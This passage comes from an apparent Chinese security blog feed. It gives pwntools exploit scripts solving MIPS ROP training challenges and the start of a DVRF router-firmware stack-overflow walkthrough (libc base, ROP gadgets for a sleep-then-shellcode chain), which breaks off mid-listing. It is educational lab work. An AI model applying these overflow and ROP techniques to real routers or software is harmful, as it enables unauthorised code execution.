    <content type="html"><![CDATA[<p>与路由环境不同，这里所用到的是glibc，所以需要提前下载好相应的动态链接库</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libc6-mipsel-cross<br></code></pre></td></tr></table></figure><p>​                       </p><p>MIPS动态库中的外部符号调用，是依赖<code>.got</code>段和<code>.MIPS.stubs</code>段来共同实现的，<code>.MIPS.stubs</code>类似于x86的<code>.plt</code>。</p><h4 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1.ret2win"></a>1.ret2win</h4><p>直接找到函数ret2win地址去执行 system(“&#x2F;bin&#x2F;cat flag.txt”)，输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2win_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2win_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(<span class="hljs-number">0x400a00</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="2-split"><a href="#2-split" class="headerlink" title="2.split"></a>2.split</h4><p>利用system的地址和flag.txt字符串的地址，输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;split_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./split_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400a20</span><br><span class="hljs-comment">#sys_addr = 0x400b70</span><br>sys_addr = <span class="hljs-number">0x4009ec</span><br>cat_flag = <span class="hljs-number">0x411010</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(sys_addr) +p32(cat_flag)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="3-callme"><a href="#3-callme" class="headerlink" title="3.callme"></a>3.callme</h4><p>运行callme1，callme2，callme3函数，并传递正确的参数，在if语句中执行正确的分支，才会将flag输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;callme_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./callme_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>gadget = <span class="hljs-number">0x400bb0</span><br>callme_one = <span class="hljs-number">0x400d20</span><br>callme_two = <span class="hljs-number">0x400d80</span><br>callme_three = <span class="hljs-number">0x400d10</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_one) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_two) + p32(key3) + p32(key2) + p32(key1)<br>payload += p32(gadget) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(callme_three) + p32(key3) + p32(key2) + p32(key1)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="4-write4"><a href="#4-write4" class="headerlink" title="4.write4"></a>4.write4</h4><p>通过执行print_file函数，将print_file函数参数flag.txt写到data段或者bss段上，可输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;write4_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&quot;write4_mipsel&quot;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget = <span class="hljs-number">0x400930</span><br>print_file = <span class="hljs-number">0x400a90</span><br>pwnme = <span class="hljs-number">0x400a70</span><br>buf = <span class="hljs-number">0x411000</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;flag&#x27;</span> + p32(buf) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + <span class="hljs-string">b&#x27;.txt&#x27;</span> + p32(buf + <span class="hljs-number">4</span>) + p32(pwnme)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x24</span> + p32(gadget + <span class="hljs-number">0x18</span>) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(print_file) + p32(buf)<br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="5-badchars"><a href="#5-badchars" class="headerlink" title="5.badchars"></a>5.badchars</h4><p>与write4一样，通过执行print_file函数，将print_file函数参数flag.txt写到data段或者bss段上，可输出flag</p><p>但会对字符串判断，如果字符串中’有x’，’g’，’a’，’.’这些字符就会赋值为-21，可以通过xor加密绕过判断，</p><p>然后xor还原。和x86不同的是MIPS需要地址对齐才能正常取出字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;badchars_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./badchars_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400930</span><br>gadget2 = <span class="hljs-number">0x400948</span><br>gadget3 = <span class="hljs-number">0x400968</span><br>buf = <span class="hljs-number">0x411000</span><br><br>badchars = [<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>]<br>new_flag = <span class="hljs-string">&quot;&quot;</span><br>xor_byte = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    output = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;flag.txt&quot;</span>:<br>        c = <span class="hljs-built_in">ord</span>(i)  ^  xor_byte<br>        c =  <span class="hljs-built_in">chr</span>(c)<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> badchars:<br>            xor_byte += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            output += c<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) == <span class="hljs-number">8</span>:<br>        new_flag = output<br>        <span class="hljs-keyword">break</span><br>new_flag = <span class="hljs-built_in">bytes</span>(new_flag.encode())<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + p32(<span class="hljs-number">0</span>) + new_flag[:<span class="hljs-number">4</span>] + p32(buf) + p32(gadget1)<br>payload += p32(<span class="hljs-number">0</span>) + new_flag[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>] + p32(buf + <span class="hljs-number">4</span>) + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf) + p32(xor_b)  + p32(gadget2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    xor_b = xor_byte &lt;&lt; (i * <span class="hljs-number">8</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_b)  + p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) + p32(buf + <span class="hljs-number">4</span>) + p32(xor_byte &lt;&lt; <span class="hljs-number">24</span>)  + p32(gadget3) <br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x400ab0</span>) + p32(buf)<br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>) <br></code></pre></td></tr></table></figure><h4 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7.pivot"></a>7.pivot</h4><p>溢出后利用栈迁移修改foothold_function函数got表的地址为ret2win的地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pivot_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./pivot_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x400ca0</span><br>gadget2 = <span class="hljs-number">0x400cb0</span><br>gadget3 = <span class="hljs-number">0x400cc4</span><br>gadget4 = <span class="hljs-number">0x400cd0</span><br><br>foothold = <span class="hljs-number">0x400e60</span><br>foothold_got = <span class="hljs-number">0x412060</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>pivot_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br><br>payload1 = p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(foothold)<br>payload1 += p32(<span class="hljs-number">0</span>) + p32(foothold_got) + p32(gadget1) + p32(<span class="hljs-number">0</span>) +  p32(<span class="hljs-number">0x378</span>) + p32(gadget3)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">32</span> + p32(pivot_addr) + p32(gadget4)<br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, payload2)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8.ret2csu"></a>8.ret2csu</h4><p>使用glibc编译的·MIPS架构程序同样拥有libc_csu_init段，所以使用ret2csu调用ret2win函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2csu_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2csu_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x4009c0</span><br>gadget2 = <span class="hljs-number">0x4009a0</span><br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(<span class="hljs-number">0x411058</span>)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(<span class="hljs-number">1</span>)<br>payload += p32(key1)<br>payload += p32(key2)<br>payload += p32(key3)<br>payload += p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVRF路由漏洞靶机中几道题的复现</title>
    <link href="/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/"/>
    <url>/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><p>使用binwalk提取固件DVRF_v03.bin</p><p>本地环境：kali-2022.2，qemu-7.0</p><h3 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h3><h4 id="栈溢出分析"><a href="#栈溢出分析" class="headerlink" title="栈溢出分析"></a>栈溢出分析</h4><p>使用ida分析，使用strcpy了函数，只要不出现\x00字符，就可以实现栈溢出。</p><p>启动程序：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">qemu-mipsel -L .<span class="hljs-regexp">/ -g 1234 ./</span>pwnable<span class="hljs-regexp">/ShellCode_Required/</span>stack_bof_02 aaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><p>关于溢出的字节数，我是直接用pwndbg观察栈上的地址和程序中的汇编计算出的：0x407ffdd0 + 0x214 -  0x407ffde8 &#x3D; 0x1fc</p><p>​       <img src="/img/5/Screenshot_20221110_055957.png" style="zoom:67%;" />        </p><p>​                                                                     </p><p>由于没有后门函数，这里可以使用shellcode，</p><ol><li>MIPS不支持NX保护，写入栈中的shellcode可以直接被执行；</li><li>使用ROP劫持控制流，虽然程序gadget很少，但libc文件中有大量的gadget，且qemu模拟无法做到地址随机化，libc的基地址每次启动也都是固定的；</li><li>由于缓存不一致性，指令cache和数据cache两者的同步需要一个时间来同步，否则就会失效；这里需要调用sleep函数来让shellcode从数据cache刷新到指令cache，然后在跳转到shellcode去执行。</li></ol><p>libc基地址的寻找：</p> <img src="/img/5/Screenshot_20221110_052742.png" style="zoom:67%;" /><p>查看puts函数的调用 ,然后在libc文件中找到偏移 0x3fefc420 - 0x17420  &#x3D; 0x3fee5000 （不同的环境模拟出的地址也会有所不同）</p><h4 id="编写ROP"><a href="#编写ROP" class="headerlink" title="编写ROP"></a>编写ROP</h4><p>这里我是参考H4lo师傅的<a href="https://www.cnblogs.com/H4lo/p/10542913.html">文章</a>去寻找的gadget</p><p>使用mipsrop找到的gadget跳转到指定地址大多都是通过另一个寄存器去赋值，而原程序中我们溢出后只能控制$ra寄存器，无法控制更多的寄存器；为了方便gadget的使用，首先溢出后劫持到scandir函数结尾部分，让我们可以控制更多的寄存器：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE0 <span class="hljs-number">3</span>C <span class="hljs-number">00</span> BF <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$ra</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s24</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE4 <span class="hljs-number">38</span> <span class="hljs-number">00</span> BE <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$fp</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s20</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE8 <span class="hljs-number">34</span> <span class="hljs-number">00</span> B7 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s7</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s1C</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFEC <span class="hljs-number">30</span> <span class="hljs-number">00</span> B6 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s6</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s18</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF0 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> B5 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s5</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s14</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF4 <span class="hljs-number">28</span> <span class="hljs-number">00</span> B4 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s4</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s10</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF8 <span class="hljs-number">24</span> <span class="hljs-number">00</span> B3 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s3</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_sC</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFFC <span class="hljs-number">20</span> <span class="hljs-number">00</span> B2 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s2</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s8</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B000 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> B1 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s1</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s4</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B004 <span class="hljs-number">18</span> <span class="hljs-number">00</span> B0 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s0</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s0</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B008 <span class="hljs-number">08</span> <span class="hljs-number">00</span> E0 <span class="hljs-number">03</span>                   jr      <span class="hljs-variable">$ra</span><br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B00C <span class="hljs-number">40</span> <span class="hljs-number">00</span> BD <span class="hljs-number">27</span>                   addiu   <span class="hljs-variable">$sp</span>, <span class="hljs-number">0</span>x40<br></code></pre></td></tr></table></figure><p>再使用mipsrop.find(“li $a0,1”)找到相应的gadget，将$a0赋值为1，作为sleep函数的参数，如果$a0本身就存在值也可以不用这个操作，可能sleep的时间会长一点：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB10 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>                   li      $a0, <span class="hljs-number">1</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB14 <span class="hljs-number">21</span> C8 <span class="hljs-number">20</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s1<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB18 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br></code></pre></td></tr></table></figure><p>调用sleep函数后还需要进一步调用shellcode，所以给$a0赋值值后不能直接去执行sleep函数，这里要进一步调用xdr_union函数结尾部分，执行完sleep函数后可以继续沿着ROP链执行：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C34 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">s3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C38 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">BF </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s14($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C3C <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B4 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s4</span>, <span class="hljs-number">0x18</span>+var_s10($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C40 <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B3 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s3</span>, <span class="hljs-number">0x18</span>+var_sC($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C44 <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B2 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s2</span>, <span class="hljs-number">0x18</span>+var_s8($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C48 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">B1 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s1</span>, <span class="hljs-number">0x18</span>+var_s4($<span 